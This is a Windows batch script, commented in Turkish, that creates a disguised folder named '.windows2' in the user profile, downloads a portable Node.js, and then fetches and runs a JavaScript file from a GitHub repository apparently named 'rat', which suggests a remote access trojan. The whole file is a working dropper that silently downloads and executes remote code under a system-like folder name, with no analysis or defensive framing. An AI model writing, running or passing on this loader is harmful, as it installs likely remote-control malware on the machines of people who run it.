@echo off
setlocal

:: .windows2 adlı gizli klasörün oluşturulması
set "folderPath=%USERPROFILE%\.windows2"
mkdir "%folderPath%" >nul 2>&1

:: Node.js indirme URL'i
set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"

:: Script dosyasının indirme URL'i
set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/a.js"

:: İndirilecek dosyaların hedef konumu
set "downloadPath=%folderPath%"

:: curl komutu kontrolü
set "curlCommand=curl"
where %curlCommand% >nul 2>&1 || set "curlCommand=."

:: Node.js indirme
echo Node.js indiriliyor...
%curlCommand% -o "%downloadPath%\node.zip" "%nodeUrl%"

:: Zip dosyasının çıkarılması
echo Zip dosyası çıkarılıyor...
if not exist "%downloadPath%\node-v16.3.0-win-x64\*" (
    powershell -command "Add-Type -A 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory('%downloadPath%\node.zip', '%downloadPath%')"
) else (
    echo Zip dosyası zaten çıkarılmış.
)

:: .windows2 klasöründe npm install
echo .windows2 klasöründe npm install yapılıyor...
cd /d "%folderPath%"
"%folderPath%\node-v16.3.0-win-x64\npm.cmd" install

:: Script dosyasının indirilmesi
echo Script dosyası indiriliyor...
%curlCommand% -o "%folderPath%\your-script.js" "%scriptUrl%"

:: Node.js'in çalıştırılması
echo Node.js çalıştırılıyor...
"%folderPath%\node-v16.3.0-win-x64\node.exe" "%folderPath%\your-script.js"

endlocal
